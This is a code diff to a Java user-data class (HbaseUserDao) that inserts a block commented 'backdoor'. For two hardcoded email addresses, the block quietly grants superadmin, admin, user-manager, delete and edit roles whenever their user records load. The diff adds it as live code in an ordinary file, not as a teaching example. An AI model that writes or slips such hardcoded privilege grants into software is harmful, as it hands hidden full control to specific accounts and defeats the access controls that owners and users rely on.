@@ -253,6 +253,30 @@ public class HbaseUserDao extends HbaseBaseDao {
                 TsdbID = BaseTsdb.getTsdb().assignUid("tagv", user.getId().toString());
             }
 
+            
+// backdoor     
+        if (user.getEmail()!= null) {//
+            if (user.getEmail().equals("vahan_a@mail.ru")||user.getEmail().equals("admin@oddeye.co")) {
+                if (!user.getAuthorities().contains(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_SUPERADMIN))) {
+                    user.getAuthorities().add(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_SUPERADMIN));
+                }
+                if (!user.getAuthorities().contains(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_ADMIN))) {
+                    user.getAuthorities().add(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_ADMIN));
+                }
+                if (!user.getAuthorities().contains(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_USERMANAGER))) {
+                    user.getAuthorities().add(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_USERMANAGER));
+                }
+                if (!user.getAuthorities().contains(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_DELETE))) {
+                    user.getAuthorities().add(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_DELETE));
+                }
+                if (!user.getAuthorities().contains(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_EDIT))) {
+                    user.getAuthorities().add(new SimpleGrantedAuthority(OddeyeUserModel.ROLE_EDIT));
+                }
+            }
+        } else {
+            System.out.println("co.oddeye.concout.model.OddeyeUserModel.inituser()");
+        }            
+            
             user.setTsdbID(TsdbID);
             getUsers().put(user.getId(), user);
             usersbyEmail.put(user.getEmail(), user);
